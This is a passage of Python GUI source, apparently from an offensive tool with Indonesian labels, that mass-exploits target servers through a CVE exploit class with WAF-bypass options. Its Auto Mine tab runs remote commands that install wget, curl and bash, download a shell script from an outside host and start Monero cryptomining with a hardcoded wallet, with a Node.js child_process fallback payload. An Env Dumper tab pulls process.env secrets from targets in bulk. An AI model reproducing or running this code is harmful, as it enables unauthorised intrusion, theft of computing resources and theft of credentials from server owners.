        import urllib.parse
        
        lines = targets_text.strip().split('\n')
        parsed_urls = []
        
        # Pattern to match URL (with optional port) - stops at space or [
        # Matches: http://host:port or https://host:port or http://host or https://host
        url_pattern = re.compile(r'(https?://[^\s\[\]]+)')
        
        for line in lines:
            line = line.strip()
            if not line or line.startswith('#'):
                continue
            
            # Find first URL in the line (handles URL at start or anywhere)
            match = url_pattern.search(line)
            if match:
                url = match.group(1)
                # Parse and reconstruct URL with only scheme, hostname, and port
                try:
                    parsed = urllib.parse.urlparse(url)
                    # Reconstruct URL with only scheme, hostname, and port
                    if parsed.port:
                        base_url = f"{parsed.scheme}://{parsed.hostname}:{parsed.port}"
                    else:
                        base_url = f"{parsed.scheme}://{parsed.hostname}"
                    parsed_urls.append(base_url)
                except Exception:
                    # If parsing fails, try to extract manually
                    # Remove path if any
                    if '/' in url[8:]:  # After 'http://' or 'https://'
                        scheme_end = url.find('://') + 3
                        host_part = url[scheme_end:].split('/')[0]
                        scheme = url[:scheme_end-3]
                        base_url = f"{scheme}://{host_part}"
                        parsed_urls.append(base_url)
                    else:
                        parsed_urls.append(url)
        
        # Remove duplicates while preserving order
        seen = set()
        unique_urls = []
        for url in parsed_urls:
            if url not in seen:
                seen.add(url)
                unique_urls.append(url)
        
        return unique_urls
    
    def _create_auto_mine_tab(self, parent):
        """Create Auto Mine tab."""
        # Instructions
        info_frame = ttk.LabelFrame(parent, text="Instruksi", padding=5)
        info_frame.pack(fill=tk.X, pady=2)
        
        info_text = "Pilih pool, masukkan wallet, dan list target. Script akan otomatis install requirements dan setup mining di setiap target."
        ttk.Label(info_frame, text=info_text, font=('TkDefaultFont', 9), 
                 foreground='gray', wraplength=600).pack(anchor=tk.W)
        
        # Configuration frame
        config_frame = ttk.LabelFrame(parent, text="Konfigurasi", padding=5)
        config_frame.pack(fill=tk.X, pady=5)
        
        # Pool selection
        pool_frame = ttk.Frame(config_frame)
        pool_frame.pack(fill=tk.X, pady=2)
        ttk.Label(pool_frame, text="Pool:").pack(side=tk.LEFT, padx=5)
        self.mine_pool_var = tk.StringVar(value="c3pool")
        pool_combo = ttk.Combobox(pool_frame, textvariable=self.mine_pool_var, 
                                  values=["c3pool"], state="readonly", width=20)
        pool_combo.pack(side=tk.LEFT, padx=5)
        ttk.Label(pool_frame, text="(soon: more pools)", font=('TkDefaultFont', 8), 
                 foreground='gray').pack(side=tk.LEFT, padx=5)
        
        # Wallet input
        wallet_frame = ttk.Frame(config_frame)
        wallet_frame.pack(fill=tk.X, pady=2)
        ttk.Label(wallet_frame, text="Wallet:").pack(side=tk.LEFT, padx=5)
        self.mine_wallet_entry = ttk.Entry(wallet_frame, width=50)
        self.mine_wallet_entry.insert(0, "42VJwP9Pkw4a3UCAdThdFC6FuorqjJKR3Qj1seau1xM5XMaVmiWzRmQ23b6i9ezS3FMaY2eugSwgTMMzyi4g8tysBu96tqE")
        self.mine_wallet_entry.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=5)
        
        # Timeout input
        timeout_frame = ttk.Frame(config_frame)
        timeout_frame.pack(fill=tk.X, pady=2)
        ttk.Label(timeout_frame, text="Timeout (detik):").pack(side=tk.LEFT, padx=5)
        self.mine_timeout_var = tk.StringVar(value="30")
        timeout_entry = ttk.Entry(timeout_frame, textvariable=self.mine_timeout_var, width=10)
        timeout_entry.pack(side=tk.LEFT, padx=5)
        
        # Target list
        target_frame = ttk.LabelFrame(parent, text="List Target", padding=5)
        target_frame.pack(fill=tk.BOTH, expand=True, pady=5)
        
        ttk.Label(target_frame, text="Masukkan list target (satu per baris). URL akan otomatis di-extract dari setiap line.").pack(anchor=tk.W, pady=2)
        self.mine_targets_text = scrolledtext.ScrolledText(target_frame, height=8, wrap=tk.WORD,
                                                           font=('Consolas', 9) if sys.platform == 'win32' else ('Monospace', 9))
        self.mine_targets_text.pack(fill=tk.BOTH, expand=True, pady=2)
        
        # Buttons
        btn_frame = ttk.Frame(parent)
        btn_frame.pack(fill=tk.X, pady=5)
        self.mine_start_btn = ttk.Button(btn_frame, text="Start Mining Setup", 
                                         command=self._start_auto_mine)
        self.mine_start_btn.pack(side=tk.LEFT, padx=5)
        self.mine_stop_btn = ttk.Button(btn_frame, text="Stop", 
                                       command=self._stop_auto_mine, state=tk.DISABLED)
        self.mine_stop_btn.pack(side=tk.LEFT, padx=5)
        
        # Progress
        self.mine_progress_var = tk.StringVar(value="Ready")
        ttk.Label(parent, textvariable=self.mine_progress_var, font=('TkDefaultFont', 9)).pack(anchor=tk.W, pady=2)
        
        # Log output
        ttk.Label(parent, text="Log:").pack(anchor=tk.W, pady=(10, 5))
        self.mine_log_output = scrolledtext.ScrolledText(
            parent,
            wrap=tk.WORD,
            font=('Consolas', 9) if sys.platform == 'win32' else ('Monospace', 9),
            height=12
        )
        self.mine_log_output.pack(fill=tk.BOTH, expand=True)
        
        # Configure text colors
        self.mine_log_output.tag_config("success", foreground="#00AA00")  # Green
        self.mine_log_output.tag_config("info", foreground="#0066CC")     # Blue
        self.mine_log_output.tag_config("error", foreground="#CC0000")    # Red
        self.mine_log_output.tag_config("warning", foreground="#0066CC")  # Blue
        
        # Mining state
        self.mine_running = False
        self.mine_stop_flag = False
    
    def _create_env_dumper_tab(self, parent):
        """Create Env Dumper tab."""
        # Instructions
        info_frame = ttk.LabelFrame(parent, text="Instruksi", padding=5)
        info_frame.pack(fill=tk.X, pady=2)
        
        info_text = "Dump process.env dari setiap target. Hasil akan disimpan ke folder yang dipilih setelah selesai atau saat stop."
        ttk.Label(info_frame, text=info_text, font=('TkDefaultFont', 9), 
                 foreground='gray', wraplength=600).pack(anchor=tk.W)
        
        # Configuration frame
        config_frame = ttk.LabelFrame(parent, text="Konfigurasi", padding=5)
        config_frame.pack(fill=tk.X, pady=5)
        
        # Threads input
        threads_frame = ttk.Frame(config_frame)
        threads_frame.pack(fill=tk.X, pady=2)
        ttk.Label(threads_frame, text="Threads:").pack(side=tk.LEFT, padx=5)
        self.env_threads_var = tk.StringVar(value="10")
        threads_entry = ttk.Entry(threads_frame, textvariable=self.env_threads_var, width=10)
        threads_entry.pack(side=tk.LEFT, padx=5)
        
        # Timeout input
        ttk.Label(threads_frame, text="Timeout (detik):").pack(side=tk.LEFT, padx=5)
        self.env_timeout_var = tk.StringVar(value="30")
        timeout_entry = ttk.Entry(threads_frame, textvariable=self.env_timeout_var, width=10)
        timeout_entry.pack(side=tk.LEFT, padx=5)
        
        # Save directory
        save_frame = ttk.Frame(config_frame)
        save_frame.pack(fill=tk.X, pady=2)
        ttk.Label(save_frame, text="Save Directory:").pack(side=tk.LEFT, padx=5)
        self.env_save_dir_var = tk.StringVar(value="")
        save_dir_entry = ttk.Entry(save_frame, textvariable=self.env_save_dir_var, width=40)
        save_dir_entry.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=5)
        browse_btn = ttk.Button(save_frame, text="Browse", command=self._browse_save_directory)
        browse_btn.pack(side=tk.LEFT, padx=5)
        
        # Target list
        target_frame = ttk.LabelFrame(parent, text="List Target", padding=5)
        target_frame.pack(fill=tk.BOTH, expand=True, pady=5)
        
        ttk.Label(target_frame, text="Masukkan list target (satu per baris). URL akan otomatis di-extract dari setiap line.").pack(anchor=tk.W, pady=2)
        self.env_targets_text = scrolledtext.ScrolledText(target_frame, height=8, wrap=tk.WORD,
                                                          font=('Consolas', 9) if sys.platform == 'win32' else ('Monospace', 9))
        self.env_targets_text.pack(fill=tk.BOTH, expand=True, pady=2)
        
        # Buttons
        btn_frame = ttk.Frame(parent)
        btn_frame.pack(fill=tk.X, pady=5)
        self.env_start_btn = ttk.Button(btn_frame, text="Start Dump", 
                                        command=self._start_env_dump)
        self.env_start_btn.pack(side=tk.LEFT, padx=5)
        self.env_stop_btn = ttk.Button(btn_frame, text="Stop", 
                                      command=self._stop_env_dump, state=tk.DISABLED)
        self.env_stop_btn.pack(side=tk.LEFT, padx=5)
        
        # Progress
        self.env_progress_var = tk.StringVar(value="Ready")
        ttk.Label(parent, textvariable=self.env_progress_var, font=('TkDefaultFont', 9)).pack(anchor=tk.W, pady=2)
        
        # Log output
        ttk.Label(parent, text="Log:").pack(anchor=tk.W, pady=(10, 5))
        self.env_log_output = scrolledtext.ScrolledText(
            parent,
            wrap=tk.WORD,
            font=('Consolas', 9) if sys.platform == 'win32' else ('Monospace', 9),
            height=12
        )
        self.env_log_output.pack(fill=tk.BOTH, expand=True)
        
        # Configure text colors
        self.env_log_output.tag_config("success", foreground="#00AA00")  # Green
        self.env_log_output.tag_config("info", foreground="#0066CC")     # Blue
        self.env_log_output.tag_config("error", foreground="#CC0000")    # Red
        
        # Env dump state
        self.env_running = False
        self.env_stop_flag = False
        self.env_results = {}  # Store results: {url: env_data or None}
        self.env_results_lock = threading.Lock()
        self.env_executor = None
        self.env_futures = []
    
    def _start_auto_mine(self):
        """Start auto mining setup."""
        if self.mine_running:
            messagebox.showwarning("Warning", "Mining setup sedang berjalan", parent=self.root)
            return
        
        wallet = self.mine_wallet_entry.get().strip()
        if not wallet:
            messagebox.showerror("Error", "Masukkan wallet address", parent=self.root)
            return
        
        targets_text = self.mine_targets_text.get('1.0', tk.END).strip()
        if not targets_text:
            messagebox.showerror("Error", "Masukkan list target", parent=self.root)
            return
        
        try:
            timeout = int(self.mine_timeout_var.get())
            if timeout < 1:
                raise ValueError("Timeout harus lebih besar dari 0")
        except ValueError:
            timeout = 30
        
        # Parse targets
        targets = self._parse_mine_targets(targets_text)
        if not targets:
            messagebox.showerror("Error", "Tidak ada target yang valid ditemukan", parent=self.root)
            return
        
        # Set state
        self.mine_running = True
        self.mine_stop_flag = False
        self.mine_start_btn.config(state=tk.DISABLED)
        self.mine_stop_btn.config(state=tk.NORMAL)
        
        # Clear log
        self.mine_log_output.delete('1.0', tk.END)
        self.mine_log_output.insert('1.0', f"Starting mining setup for {len(targets)} targets...\n")
        self.mine_log_output.insert(tk.END, f"Pool: {self.mine_pool_var.get()}\n")
        self.mine_log_output.insert(tk.END, f"Wallet: {wallet}\n")
        self.mine_log_output.insert(tk.END, f"Timeout: {timeout}s\n")
        self.mine_log_output.insert(tk.END, "=" * 60 + "\n\n")
        
        # Start mining process
        threading.Thread(target=self._execute_auto_mine, args=(targets, wallet, timeout), daemon=True).start()
    
    def _stop_auto_mine(self):
        """Stop auto mining setup."""
        self.mine_stop_flag = True
        self.mine_progress_var.set("Stopping...")
    
    def _execute_auto_mine(self, targets: List[str], wallet: str, timeout: int):
        """Execute mining setup for each target sequentially."""
        total = len(targets)
        
        try:
            for idx, target_url in enumerate(targets, 1):
                if self.mine_stop_flag:
                    self.root.after(0, lambda: self.mine_log_output.insert(tk.END, "\n[STOPPED] Mining setup dihentikan oleh user\n", "warning"))
                    break
                
                # Update progress
                self.root.after(0, lambda t=target_url, i=idx, tot=total: 
                              self.mine_progress_var.set(f"Processing {i}/{tot}: {t}"))
                
                # Add log header
                self.root.after(0, lambda t=target_url, i=idx: 
                              self.mine_log_output.insert(tk.END, f"\n[{i}] {t}\n" + "-" * 60 + "\n", "info"))
                
                try:
                    # Create exploit instance with timeout
                    mine_exploit = CVEExploit(timeout=timeout, verify_ssl=False)
                    mine_exploit.update_proxy(
                        self.proxy_check_var.get(),
                        self.proxy_entry.get()
                    )
                    
                    # Disable retries
                    for prefix in ('http://', 'https://'):
                        if prefix in mine_exploit.session.adapters:
                            adapter = mine_exploit.session.adapters[prefix]
                            from urllib3.util.retry import Retry
                            adapter.max_retries = Retry(total=0, connect=0, read=0, redirect=0, status=0, other=0, backoff_factor=0)
                    
                    # Execute mining setup with proper requirements checking
                    # This avoids 500 errors from overly complex JavaScript payloads
                    self.root.after(0, lambda: self.mine_log_output.insert(tk.END, "=== Starting Mining Setup ===\n", "info"))
                    
                    email = 'vooyage@mail.co'
                    # Escape single quotes in wallet and email to prevent shell injection
                    wallet_escaped = wallet.replace("'", "'\\''")
                    email_escaped = email.replace("'", "'\\''")
                    
                    # Initialize variables for requirements checking
                    pm_name = None
                    has_wget = False
                    has_curl = False
                    has_bash = False
                    
                    # Step 1: Detect package manager
                    self.root.after(0, lambda: self.mine_log_output.insert(tk.END, "Step 1: Detecting package manager...\n", "info"))
                    detect_pm_cmd = "which apt-get 2>/dev/null || which apk 2>/dev/null || which yum 2>/dev/null || which dnf 2>/dev/null || which pacman 2>/dev/null || which zypper 2>/dev/null || echo 'NONE'"
                    
                    pm_result = mine_exploit.execute_command_auto(
                        target_url,
                        self.endpoint_entry.get(),
                        detect_pm_cmd,
                        self.unicode_waf_var.get(),
                        self.utf16_waf_var.get(),
                        self.aes_var.get(),
                        False,
                        self.payload_type_var.get()
                    )
                    pm_result = pm_result.strip() if pm_result else ""
                    
                    if not pm_result or pm_result == "NONE" or "/" not in pm_result:
                        raise Exception("No supported package manager found (apt-get, apk, yum, dnf, pacman, zypper)")
                    
                    # Extract package manager name
                    pm_name = pm_result.split('/')[-1] if '/' in pm_result else pm_result
                    self.root.after(0, lambda pm=pm_name: self.mine_log_output.insert(tk.END, f"✓ Package manager found: {pm}\n", "success"))
                    
                    # Step 2: Check required tools (wget, curl, bash)
                    self.root.after(0, lambda: self.mine_log_output.insert(tk.END, "Step 2: Checking required tools (wget, curl, bash)...\n", "info"))
                    check_tools_cmd = "which wget 2>/dev/null && echo 'WGET_OK' || echo 'WGET_MISSING'; which curl 2>/dev/null && echo 'CURL_OK' || echo 'CURL_MISSING'; which bash 2>/dev/null && echo 'BASH_OK' || echo 'BASH_MISSING'"
                    
                    check_result = mine_exploit.execute_command_auto(
                        target_url,
                        self.endpoint_entry.get(),
                        check_tools_cmd,
                        self.unicode_waf_var.get(),
                        self.utf16_waf_var.get(),
                        self.aes_var.get(),
                        False,
                        self.payload_type_var.get()
                    )
                    
                    has_wget = "WGET_OK" in check_result
                    has_curl = "CURL_OK" in check_result
                    has_bash = "BASH_OK" in check_result
                    
                    self.root.after(0, lambda: self.mine_log_output.insert(tk.END, f"wget: {'✓ OK' if has_wget else '✗ MISSING'}\n", "success" if has_wget else "error"))
                    self.root.after(0, lambda: self.mine_log_output.insert(tk.END, f"curl: {'✓ OK' if has_curl else '✗ MISSING'}\n", "success" if has_curl else "error"))
                    self.root.after(0, lambda: self.mine_log_output.insert(tk.END, f"bash: {'✓ OK' if has_bash else '✗ MISSING'}\n", "success" if has_bash else "error"))
                    
                    # Step 3: Install missing requirements
                    if not has_wget or not has_curl or not has_bash:
                        self.root.after(0, lambda: self.mine_log_output.insert(tk.END, "Step 3: Installing missing requirements...\n", "info"))
                        
                        install_commands = []
                        if not has_wget:
                            if pm_name == "apt-get":
                                install_commands.append("DEBIAN_FRONTEND=noninteractive apt-get update -qq && DEBIAN_FRONTEND=noninteractive apt-get install -y wget 2>&1")
                            elif pm_name == "apk":
                                install_commands.append("apk add --no-cache wget 2>&1")
                            elif pm_name == "yum":
                                install_commands.append("yum install -y wget 2>&1")
                            elif pm_name == "dnf":
                                install_commands.append("dnf install -y wget 2>&1")
                            elif pm_name == "pacman":
                                install_commands.append("pacman -S --noconfirm wget 2>&1")
                            elif pm_name == "zypper":
                                install_commands.append("zypper install -y wget 2>&1")
                        
                        if not has_curl:
                            if pm_name == "apt-get":
                                install_commands.append("DEBIAN_FRONTEND=noninteractive apt-get update -qq && DEBIAN_FRONTEND=noninteractive apt-get install -y curl 2>&1")
                            elif pm_name == "apk":
                                install_commands.append("apk add --no-cache curl 2>&1")
                            elif pm_name == "yum":
                                install_commands.append("yum install -y curl 2>&1")
                            elif pm_name == "dnf":
                                install_commands.append("dnf install -y curl 2>&1")
                            elif pm_name == "pacman":
                                install_commands.append("pacman -S --noconfirm curl 2>&1")
                            elif pm_name == "zypper":
                                install_commands.append("zypper install -y curl 2>&1")
                        
                        if not has_bash:
                            if pm_name == "apt-get":
                                install_commands.append("DEBIAN_FRONTEND=noninteractive apt-get update -qq && DEBIAN_FRONTEND=noninteractive apt-get install -y bash 2>&1")
                            elif pm_name == "apk":
                                install_commands.append("apk add --no-cache bash 2>&1")
                            elif pm_name == "yum":
                                install_commands.append("yum install -y bash 2>&1")
                            elif pm_name == "dnf":
                                install_commands.append("dnf install -y bash 2>&1")
                            elif pm_name == "pacman":
                                install_commands.append("pacman -S --noconfirm bash 2>&1")
                            elif pm_name == "zypper":
                                install_commands.append("zypper install -y bash 2>&1")
                        
                        # Execute install commands
                        for install_cmd in install_commands:
                            try:
                                install_res = mine_exploit.execute_command_auto(
                                    target_url,
                                    self.endpoint_entry.get(),
                                    install_cmd,
                                    self.unicode_waf_var.get(),
                                    self.utf16_waf_var.get(),
                                    self.aes_var.get(),
                                    False,
                                    self.payload_type_var.get()
                                )
                                self.root.after(0, lambda r=install_res: self.mine_log_output.insert(tk.END, f"Install output: {r[:200]}...\n", "info"))
                            except Exception as e:
                                self.root.after(0, lambda msg=str(e): self.mine_log_output.insert(tk.END, f"Install warning: {msg}\n", "error"))
                        
                        # Wait a bit for packages to be available
                        import time
                        time.sleep(2)
                    
                    # Step 4: Verify all requirements are installed
                    self.root.after(0, lambda: self.mine_log_output.insert(tk.END, "Step 4: Verifying all requirements...\n", "info"))
                    verify_cmd = "which wget 2>/dev/null && echo 'WGET_VERIFIED' || echo 'WGET_FAILED'; which curl 2>/dev/null && echo 'CURL_VERIFIED' || echo 'CURL_FAILED'; which bash 2>/dev/null && echo 'BASH_VERIFIED' || echo 'BASH_FAILED'"
                    
                    verify_result = mine_exploit.execute_command_auto(
                        target_url,
                        self.endpoint_entry.get(),
                        verify_cmd,
                        self.unicode_waf_var.get(),
                        self.utf16_waf_var.get(),
                        self.aes_var.get(),
                        False,
                        self.payload_type_var.get()
                    )
                    
                    wget_ok = "WGET_VERIFIED" in verify_result
                    curl_ok = "CURL_VERIFIED" in verify_result
                    bash_ok = "BASH_VERIFIED" in verify_result
                    
                    if not wget_ok or not curl_ok or not bash_ok:
                        missing = []
                        if not wget_ok: missing.append("wget")
                        if not curl_ok: missing.append("curl")
                        if not bash_ok: missing.append("bash")
                        raise Exception(f"Required tools not available after installation: {', '.join(missing)}")
                    
                    self.root.after(0, lambda: self.mine_log_output.insert(tk.END, "✓ All requirements verified: wget, curl, bash\n", "success"))
                    
                    # Step 5: Download script with wget
                    self.root.after(0, lambda: self.mine_log_output.insert(tk.END, "Step 5: Downloading script...\n", "info"))
                    download_cmd = "wget https://mytirtatarum.com/public/assets/guides/guides.txt -O initial.sh 2>&1"
                    
                    download_res = mine_exploit.execute_command_auto(
                        target_url,
                        self.endpoint_entry.get(),
                        download_cmd,
                        self.unicode_waf_var.get(),
                        self.utf16_waf_var.get(),
                        self.aes_var.get(),
                        False,
                        self.payload_type_var.get()
                    )
                    self.root.after(0, lambda r=download_res: self.mine_log_output.insert(tk.END, f"{r}\n", "info"))
                    
                    # Step 6: Convert line endings and prepare script
                    self.root.after(0, lambda: self.mine_log_output.insert(tk.END, "Step 6: Preparing script (convert line endings, make executable)...\n", "info"))
                    convert_cmd = "sed -i 's/\\r$//' initial.sh 2>&1 && chmod +x initial.sh 2>&1 && echo 'Script prepared'"
                    
                    convert_res = mine_exploit.execute_command_auto(
                        target_url,
                        self.endpoint_entry.get(),
                        convert_cmd,
                        self.unicode_waf_var.get(),
                        self.utf16_waf_var.get(),
                        self.aes_var.get(),
                        False,
                        self.payload_type_var.get()
                    )
                    self.root.after(0, lambda r=convert_res: self.mine_log_output.insert(tk.END, f"{r}\n", "info"))
                    
                    # Step 7: Execute script in background and capture initial output
                    self.root.after(0, lambda: self.mine_log_output.insert(tk.END, "Step 7: Starting mining setup...\n", "info"))
                    setup_cmd = f"bash initial.sh '{wallet_escaped}' '{email_escaped}' > initial_setup.log 2>&1 & sleep 2 && tail -n 50 initial_setup.log 2>&1 || echo 'Script started, check initial_setup.log for full output'"
                    
                    try:
                        res = mine_exploit.execute_command_auto(
                            target_url,
                            self.endpoint_entry.get(),
                            setup_cmd,
                            self.unicode_waf_var.get(),
                            self.utf16_waf_var.get(),
                            self.aes_var.get(),
                            False,
                            self.payload_type_var.get()
                        )
                    except Exception as cmd_error:
                        # If command execution fails, try with JavaScript approach as fallback
                        self.root.after(0, lambda: self.mine_log_output.insert(tk.END, f"Command approach failed, trying JavaScript fallback...\n", "info"))
                        try:
                            mining_code = self._generate_mining_script(wallet)
                            res = mine_exploit.execute_js_raw(
                                target_url,
                                self.endpoint_entry.get(),
                                mining_code,
                                self.unicode_waf_var.get(),
                                self.utf16_waf_var.get(),
                                self.aes_var.get(),
                                self.payload_type_var.get()
                            )
                        except Exception as js_error:
                            raise cmd_error  # Raise original error
                    
                    # Step 8: Wait a bit and read full log multiple times to show progress
                    self.root.after(0, lambda: self.mine_log_output.insert(tk.END, "Step 8: Reading setup log...\n", "info"))
                    import time
                    
                    # Read log multiple times to show progress
                    log_res = ""
                    for attempt in range(3):
                        time.sleep(2)  # Wait for script to generate output
                        read_log_cmd = "cat initial_setup.log 2>&1 || echo 'Log file not yet created'"
                        try:
                            current_log = mine_exploit.execute_command_auto(
                                target_url,
                                self.endpoint_entry.get(),
                                read_log_cmd,
                                self.unicode_waf_var.get(),
                                self.utf16_waf_var.get(),
                                self.aes_var.get(),
                                False,
                                self.payload_type_var.get()
                            )
                            if current_log and current_log.strip() and "not yet created" not in current_log.lower():
                                log_res = current_log
                                # Show progress update
                                lines = current_log.split('\n')
                                last_lines = '\n'.join(lines[-10:]) if len(lines) > 10 else current_log
                                self.root.after(0, lambda ll=last_lines, a=attempt+1: 
                                              self.mine_log_output.insert(tk.END, f"[Log read {a}/3] Last 10 lines:\n{ll}\n\n", "info"))
                                # If we see completion indicators, stop reading
                                if any(keyword in current_log.lower() for keyword in ["setup complete", "mining", "c3pool", "xmrig", "completed"]):
                                    break
                        except Exception as log_error:
                            # Continue to next attempt
                            pass
                    
                    # Final log read
                    if log_res:
                        self.root.after(0, lambda r=log_res: self.mine_log_output.insert(tk.END, f"\n--- Full Setup Log ---\n{r}\n--- End Log ---\n", "info"))
                        res = log_res
                    elif res:
                        self.root.after(0, lambda r=res: self.mine_log_output.insert(tk.END, f"\nInitial output: {r}\n", "info"))
                    else:
                        res = "Mining setup script started in background. Check initial_setup.log for full progress."
                    
                    # Parse result and determine color
                    if res:
                        res_lower = res.lower()
                        # Check for error indicators first (highest priority)
                        if any(keyword in res_lower for keyword in ["error:", "failed", "cannot", "unable", "timeout", "gagal", "not found", "no supported", "error"]):
                            result_tag = "error"  # Red
                            result_text = f"\n--- Result (Error) ---\n{res}\n"
                        # Check for success indicators
                        elif any(keyword in res_lower for keyword in ["✓", "success", "installed successfully", "verified", "ok", "completed", "downloaded successfully", "executed", "all requirements verified", "setup complete", "mining", "c3pool"]):
                            result_tag = "success"  # Green
                            result_text = f"\n--- Result (Success) ---\n{res}\n"
                        # Check for warning/info indicators
                        elif any(keyword in res_lower for keyword in ["warning", "not available", "fallback", "using", "checking", "installing", "downloading", "started"]):
                            result_tag = "info"  # Blue
                            result_text = f"\n--- Result (Info) ---\n{res}\n"
                        else:
                            result_tag = "info"
                            result_text = f"\n--- Result ---\n{res}\n"
                    else:
                        result_tag = "info"
                        result_text = "\n--- No output received ---\n"
                    
                    # Add result to log with appropriate color
                    self.root.after(0, lambda r=result_text, tag=result_tag: 
                                  self.mine_log_output.insert(tk.END, r, tag))
                    self.root.after(0, lambda: self.mine_log_output.see(tk.END))
                    
                except Exception as e:
                    error_msg = str(e)
                    self.root.after(0, lambda msg=error_msg, t=target_url: 
                                  self.mine_log_output.insert(tk.END, f"ERROR: {msg}\n", "error"))
                    self.root.after(0, lambda: self.mine_log_output.see(tk.END))
                
                # Small delay between targets
                import time
                time.sleep(0.5)
            
            # Finalize
            if not self.mine_stop_flag:
                self.root.after(0, lambda: self.mine_log_output.insert(tk.END, "\n" + "=" * 60 + "\n"))
                self.root.after(0, lambda: self.mine_log_output.insert(tk.END, f"Mining setup completed for {total} targets\n", "success"))
                self.root.after(0, lambda: self.mine_log_output.see(tk.END))
        
        finally:
            # Reset state
            self.mine_running = False
            self.mine_stop_flag = False
            self.root.after(0, lambda: self.mine_start_btn.config(state=tk.NORMAL))
            self.root.after(0, lambda: self.mine_stop_btn.config(state=tk.DISABLED))
            self.root.after(0, lambda: self.mine_progress_var.set("Ready"))
    
    def _generate_mining_script(self, wallet: str) -> str:
        """Generate mining setup script."""
        email = 'vooyage@mail.co'  # Default email, bisa diubah nanti
        
        return f"""(function(){{
    try {{
        var cp = process.mainModule.require('child_process');
        var fs = process.mainModule.require('fs');
        var wallet = '{wallet}';
        var email = '{email}';
        
        var output = [];
        
        // Function to check if command exists
        function checkCommand(cmd) {{
            try {{
                // Try multiple methods to check command
                cp.execSync('which ' + cmd + ' 2>/dev/null || command -v ' + cmd + ' 2>/dev/null || test -f /bin/' + cmd + ' || test -f /usr/bin/' + cmd, {{timeout: 5000, stdio: 'ignore'}});
                return true;
            }} catch (e) {{
                return false;
            }}
        }}
        
        // Function to detect package manager
        function detectPackageManager() {{
            var pms = ['apt-get', 'apk', 'yum', 'dnf', 'pacman', 'zypper'];
            for (var i = 0; i < pms.length; i++) {{
                if (checkCommand(pms[i])) {{
                    return pms[i];
                }}
            }}
            return null;
        }}
        
        // Function to install package with correct package name per manager
        function installPackage(pkg, pm) {{
            var installCmd = '';
            var packageName = pkg;
            
            // Package name is same for all managers for bash, wget, curl
            // No need to adjust
            
            switch(pm) {{
                case 'apt-get':
                    installCmd = 'DEBIAN_FRONTEND=noninteractive apt-get update -qq && DEBIAN_FRONTEND=noninteractive apt-get install -y ' + packageName + ' 2>&1';
                    break;
                case 'apk':
                    installCmd = 'apk add --no-cache ' + packageName + ' 2>&1';
                    break;
                case 'yum':
                    installCmd = 'yum install -y ' + packageName + ' 2>&1';
                    break;
                case 'dnf':
                    installCmd = 'dnf install -y ' + packageName + ' 2>&1';
                    break;
                case 'pacman':
                    installCmd = 'pacman -S --noconfirm ' + packageName + ' 2>&1';
                    break;
                case 'zypper':
                    installCmd = 'zypper install -y ' + packageName + ' 2>&1';
                    break;
                default:
                    return false;
            }}
            
            try {{
                var result = cp.execSync(installCmd, {{timeout: 120000, encoding: 'utf8'}});
                // Check if installation was successful by verifying package exists
                return true;
            }} catch (e) {{
                // Installation failed, but don't return false immediately
                // Some package managers return non-zero even on success
                // We'll verify by checking if command exists after
                return false;
            }}
        }}
        
        // Function to check if bash exists (check multiple paths)
        function checkBash() {{
            var bashPaths = ['/bin/bash', '/usr/bin/bash', '/usr/local/bin/bash'];
            for (var i = 0; i < bashPaths.length; i++) {{
                try {{
                    cp.execSync('test -f ' + bashPaths[i], {{timeout: 2000, stdio: 'ignore'}});
                    return true;
                }} catch (e) {{
                    // Continue checking
                }}
            }}
            return checkCommand('bash');
        }}
        
        output.push("=== Checking Requirements ===");
        
        // Check package manager
        var pm = detectPackageManager();
        if (!pm) {{
            return "ERROR: No supported package manager found";
        }}
        output.push("Package manager: " + pm);
        
        // Check bash (check multiple methods)
        var hasBash = checkBash();
        var bashWasMissing = !hasBash;
        var useShInstead = false;
        
        output.push("bash: " + (hasBash ? "OK" : "NOT FOUND"));
        
        if (!hasBash) {{
            output.push("bash NOT FOUND - Installing bash using " + pm + "...");
            var bashInstalled = false;
            
            // Try installing bash with the detected package manager
            try {{
                var installResult = installPackage('bash', pm);
                if (installResult) {{
                    // Wait a bit for package to be available
                    output.push("Waiting for bash to be available...");
                    try {{
                        cp.execSync('sleep 2', {{timeout: 3000, stdio: 'ignore'}});
                    }} catch (e) {{
                        // Ignore sleep error
                    }}
                    
                    // Verify bash is now available
                    output.push("Verifying bash installation...");
                    if (checkBash()) {{
                        output.push("✓ bash installed successfully");
                        hasBash = true;
                        bashInstalled = true;
                    }} else {{
                        // Try to find bash in common locations
                        output.push("Checking common bash locations...");
                        var bashPaths = ['/bin/bash', '/usr/bin/bash', '/usr/local/bin/bash'];
                        for (var i = 0; i < bashPaths.length; i++) {{
                            try {{
                                cp.execSync('test -x ' + bashPaths[i], {{timeout: 2000, stdio: 'ignore'}});
                                output.push("✓ Found bash at: " + bashPaths[i]);
                                hasBash = true;
                                bashInstalled = true;
                                break;
                            }} catch (e) {{
                                // Continue checking
                            }}
                        }}
                    }}
                }} else {{
                    output.push("bash installation returned false - trying alternative method...");
                    // Try direct installation command
                    try {{
                        var directCmd = '';
                        switch(pm) {{
                            case 'apt-get':
                                directCmd = 'DEBIAN_FRONTEND=noninteractive apt-get update -qq && DEBIAN_FRONTEND=noninteractive apt-get install -y bash';
                                break;
                            case 'apk':
                                directCmd = 'apk add --no-cache bash';
                                break;
                            case 'yum':
                                directCmd = 'yum install -y bash';
                                break;
                            case 'dnf':
                                directCmd = 'dnf install -y bash';
                                break;
                            case 'pacman':
                                directCmd = 'pacman -S --noconfirm bash';
                                break;
                            case 'zypper':
                                directCmd = 'zypper install -y bash';
                                break;
                        }}
                        if (directCmd) {{
                            cp.execSync(directCmd + ' 2>&1', {{timeout: 120000, encoding: 'utf8'}});
                            cp.execSync('sleep 2', {{timeout: 3000, stdio: 'ignore'}});
                            if (checkBash()) {{
                                output.push("✓ bash installed successfully (alternative method)");
                                hasBash = true;
                                bashInstalled = true;
                            }}
                        }}
                    }} catch (e) {{
                        output.push("Alternative installation also failed");
                    }}
                }}
            }} catch (e) {{
                output.push("Installation attempt failed: " + e.message);
            }}
            
            if (!bashInstalled) {{
                // Last resort: check if sh can work as bash
                output.push("bash installation failed, checking if /bin/sh is available...");
                try {{
                    cp.execSync('test -f /bin/sh && test -x /bin/sh', {{timeout: 2000, stdio: 'ignore'}});
                    output.push("WARNING: bash not available, will use /bin/sh instead");
                    useShInstead = true;
                }} catch (e) {{
                    return "ERROR: Failed to install bash and /bin/sh not found. Cannot proceed without bash or sh.";
                }}
            }}
        }}
        
        // Check wget
